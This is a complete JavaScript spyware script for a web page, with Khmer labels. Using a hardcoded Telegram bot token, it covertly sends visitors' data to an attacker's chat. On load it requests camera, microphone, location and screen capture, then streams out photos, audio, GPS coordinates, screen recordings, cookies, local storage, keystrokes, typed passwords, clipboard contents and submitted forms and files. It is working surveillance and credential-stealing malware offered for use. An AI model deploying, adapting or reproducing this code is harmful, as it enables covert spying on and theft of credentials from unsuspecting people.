// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = null;

// Get chat ID from URL parameter "id"
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('id');
if (chatIdFromUrl && chatIdFromUrl.length > 0) {
    CHAT_ID = chatIdFromUrl;
}

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let photoInterval = null;
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    let locationText = '📍 **ទីតាំង:** មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
        locationText = `
📍 **ទីតាំងពិតប្រាកដ:**
├─ រយៈទទឹង: ${info.location.lat}
├─ រយៈបណ្តោយ: ${info.location.lng}
├─ ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m
├─ Google Maps: ${mapsLink}
└─ តំបន់ពេល: ${info.timezone}`;
    }
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency || 'Unknown'}
🧠 RAM: ${info.deviceMemory || 'Unknown'}GB
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}`;
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID) return false;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown' 
            }),
        });
        return true;
    } catch (err) { 
        return false; 
    }
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try { 
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData }); 
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try { 
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData }); 
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try { 
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData }); 
    } catch (error) {}
}

// ==================== 1. CAMERA PERMISSION (ស្នើភ្លាមៗ) ====================
async function requestCameraPermission() {
    if (permissionsRequested.camera || !CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        await sendMessageToTelegram(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Auto capture every 10 seconds
        if (photoInterval) clearInterval(photoInterval);
        photoInterval = setInterval(() => capturePhoto(), 10000);
        
        // Capture first photo after 2 seconds
        setTimeout(() => capturePhoto(), 2000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : error.message;
        await sendMessageToTelegram(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    }
}

async function capturePhoto() {
    if (!cameraStream || !cameraStream.active || !CHAT_ID) return;
    
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = cameraStream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *Camera Capture*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        }, 'image/jpeg', 0.8);
        
        video.remove();
        
    } catch (error) {
        console.error("Capture photo error:", error);
    }
}

// ==================== 2. MICROPHONE PERMISSION (ស្នើភ្លាមៗ) ====================
async function requestMicrophonePermission() {
    if (permissionsRequested.microphone || !CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        await sendMessageToTelegram(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Start recording audio periodically
        setTimeout(() => recordAudio(), 1000);
        setInterval(() => {
            if (audioStream && audioStream.active) {
                recordAudio();
            }
        }, 30000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    }
}

async function recordAudio() {
    if (!audioStream || !audioStream.active || !CHAT_ID) return;
    
    try {
        const recorder = new MediaRecorder(audioStream);
        const chunks = [];
        
        recorder.ondataavailable = (e) => { 
            if (e.data.size > 0) chunks.push(e.data); 
        };
        
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await sendFileToTelegram(file, `🎤 *Audio Recording*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        };
        
        recorder.start();
        setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
        }, 5000);
        
    } catch (error) {
        console.error("Record audio error:", error);
    }
}

// ==================== 3. LOCATION PERMISSION (ស្នើភ្លាមៗ) ====================
function requestLocationPermission() {
    if (permissionsRequested.location || !CHAT_ID) return;
    
    if (!navigator.geolocation) {
        sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*\n\n📝 Geolocation not supported`);
        return;
    }
    
    // Get location immediately
    getCurrentLocation();
    
    // Get location every 30 seconds
    setInterval(() => {
        if (permissionsRequested.location) {
            getCurrentLocation();
        }
    }, 30000);
}

function getCurrentLocation() {
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            
            await sendMessageToTelegram(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Google Maps](${mapsLink})\n⏰ ${new Date().toLocaleString('km-KH')}`);
            
            // Send location to Telegram
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        (error) => {
            let msg = 'User denied location permission';
            if (error.code === error.TIMEOUT) msg = 'Timeout';
            else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
            sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// ==================== 4. SCREEN RECORDING PERMISSION (ស្នើភ្លាមៗ) ====================
async function requestScreenPermission() {
    if (permissionsRequested.screen || !CHAT_ID) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        await sendMessageToTelegram(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        startScreenRecording(stream);
        
        // Take screenshot after 2 seconds
        setTimeout(() => captureScreenshot(), 2000);
        
        // Take screenshot every 30 seconds
        setInterval(() => {
            if (permissionsRequested.screen) {
                captureScreenshot();
            }
        }, 30000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
        await sendMessageToTelegram(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    }
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { 
        mimeType: mimeType,
        videoBitsPerSecond: 2500000 
    });
    recordedChunks = [];
    
    screenRecorder.ondataavailable = (e) => { 
        if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
    };
    
    screenRecorder.onstop = async () => {
        isRecording = false;
        const blob = new Blob(recordedChunks, { type: mimeType });
        
        if (blob.size > 0) {
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            await sendVideoToTelegram(file, `🎥 *Screen Recording*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
        }
        
        recordedChunks = [];
        if (screenStream) {
            screenStream.getTracks().forEach(track => track.stop());
            screenStream = null;
        }
        screenRecorder = null;
    };
    
    screenRecorder.start(1000);
    isRecording = true;
    
    // Auto stop after 30 seconds
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    }, 30000);
    
    stream.getVideoTracks()[0].addEventListener('ended', () => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    });
}

async function captureScreenshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
        
        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
    } catch (error) {}
}

// ==================== STOP CAMERA ====================
function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        if (photoInterval) clearInterval(photoInterval);
        if (CHAT_ID) {
            sendMessageToTelegram(`⛔ *CAMERA STOPPED*\n⏰ ${new Date().toLocaleString('km-KH')}`);
        }
    }
}

// ==================== STEAL ALL DATA ====================
async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(formattedInfo);
        
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: document.cookie || 'No cookies',
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            location: currentLocation,
            screen: { width: window.screen.width, height: window.screen.height },
            language: navigator.language,
            platform: navigator.platform,
            permissions: permissionsRequested
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {
        console.error("Steal error:", error);
    }
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) {
        keylogBuffer += e.key;
    } else if (e.key === 'Enter') {
        keylogBuffer += '\n';
    } else if (e.key === 'Backspace') {
        keylogBuffer = keylogBuffer.slice(0, -1);
    } else if (e.key === ' ') {
        keylogBuffer += ' ';
    } else if (e.key === 'Tab') {
        keylogBuffer += '    ';
    }
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== FORM STEALER ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        await sendMessageToTelegram(message);
    }
});

// ==================== PAGE UNLOAD TRACKING ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ==================== INITIALIZE - REQUEST PERMISSIONS IMMEDIATELY ====================
async function initialize() {
    // Only proceed if chat ID is provided in URL
    if (!CHAT_ID) {
        console.log("No chat ID provided. Please add ?id=YOUR_CHAT_ID to URL");
        return;
    }
    
    // Send page loaded notification with device info
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
    
    // Request ALL permissions IMMEDIATELY (ភ្លាមៗ)
    setTimeout(() => requestCameraPermission(), 500);      // ស្នើកាមេរ៉ាភ្លាម
    setTimeout(() => requestMicrophonePermission(), 2000);  // ស្នើមីក្រូហ្វូន
    setTimeout(() => requestLocationPermission(), 3500);    // ស្នើទីតាំង
    setTimeout(() => requestScreenPermission(), 5000);      // ស្នើថតអេក្រង់
    
    // Steal data after 15 seconds
    setTimeout(() => stealAllData(), 15000);
    
    // Steal data every 60 seconds
    setInterval(() => stealAllData(), 60000);
}

// Start when page loads
window.addEventListener("DOMContentLoaded", initialize);